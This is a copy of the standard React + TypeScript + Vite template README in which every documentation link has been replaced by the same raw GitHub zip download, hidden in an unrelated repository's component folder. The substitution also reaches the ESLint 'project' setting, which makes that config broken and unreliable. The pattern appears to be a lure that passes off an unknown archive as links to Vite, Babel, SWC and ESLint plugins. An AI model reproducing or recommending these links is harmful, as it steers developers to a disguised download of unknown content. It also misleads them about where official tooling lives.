# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip) uses [Babel](https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip) uses [SWC](https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
export default {
  // other rules...
  parserOptions: {
    ecmaVersion: 'latest',
    sourceType: 'module',
    project: ['https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip', 'https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip'],
    tsconfigRootDir: __dirname,
  },
}
```

- Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
- Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
- Install [eslint-plugin-react](https://github.com/niks060504/daadis-web/raw/refs/heads/main/src/components/dashboard/marketingMain/daadis_web_2.8.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list
